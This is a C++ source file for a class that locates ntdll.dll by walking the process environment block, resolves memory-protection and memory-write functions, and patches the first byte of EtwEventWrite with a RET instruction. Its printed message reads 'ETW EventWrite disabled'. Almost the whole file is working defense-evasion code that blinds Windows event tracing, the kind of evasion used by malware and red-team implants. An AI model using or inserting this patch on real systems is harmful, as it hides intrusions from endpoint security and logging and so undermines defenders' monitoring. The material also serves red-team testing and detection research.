#include "HookETW.hpp"

typedef HANDLE(NTAPI* PNtCurrentProcess)();

typedef NTSTATUS(NTAPI* PNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* PZwWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG BufferSize,
    PULONG NumberOfBytesWritten
    );

ETWC3::ETWC3() {

}

ETWC3::ETWC3(std::shared_ptr<Util> u) {
    peb = u->GetPEB();
    hNtdll = FindNtdllBase();
    ntquery = u->GetFunctionAddressFromExport(hNtdll, "NtQueryInformationProcess");
    ntProtect = u->GetFunctionAddressFromExport(hNtdll, "NtProtectVirtualMemory");
    etwEvent = u->GetFunctionAddressFromExport(hNtdll, "EtwEventWrite");
    zwWrite = u->GetFunctionAddressFromExport(hNtdll, "NtWriteVirtualMemory");
    ntCurrProc = u->GetFunctionAddressFromExport(hNtdll, "NtCurrentProcess");
}

PVOID ETWC3::FindNtdllBase() {
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY moduleEntry = CONTAINING_RECORD(
            entry,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );

        // Convert UNICODE_STRING to wstring
        std::wstring baseName(
            moduleEntry->FullDllName.Buffer,
            moduleEntry->FullDllName.Length / sizeof(WCHAR)
        );

        // Case-insensitive comparison
        if (baseName.find(L"ntdll.dll") != std::string::npos) {
            return moduleEntry->DllBase;
        }
        entry = entry->Flink;
    }
    return nullptr;
}

void ETWC3::RetETW() {

    PNtProtectVirtualMemory ntPVM = reinterpret_cast<PNtProtectVirtualMemory>(ntProtect);
    PZwWriteVirtualMemory zwWVM = reinterpret_cast<PZwWriteVirtualMemory>(zwWrite);
    PNtCurrentProcess ntCP = reinterpret_cast<PNtCurrentProcess>(ntCurrProc);

    SIZE_T regionSize = 1;
    ULONG oldProt;
    BYTE patchByte = 0xC3; // RET instruction

    PVOID targetAddress = static_cast<PVOID>(etwEvent);
    PVOID target2 = targetAddress;
    
    NTSTATUS status = ntPVM(
        GetCurrentProcess(),
        &targetAddress,
        &regionSize,
        PAGE_READWRITE,
        &oldProt
    ); 

    NTSTATUS x = zwWVM( 
        GetCurrentProcess(),
        target2,
        &patchByte,
        sizeof(patchByte),
        nullptr
    );

     status = ntPVM(
        GetCurrentProcess(),
        &targetAddress,
        &regionSize,
         PAGE_EXECUTE_READ,
        &oldProt
    );
     ;
    if (NT_SUCCESS(status)) std::cout << "\n[+] ETW EventWrite disabled";

}



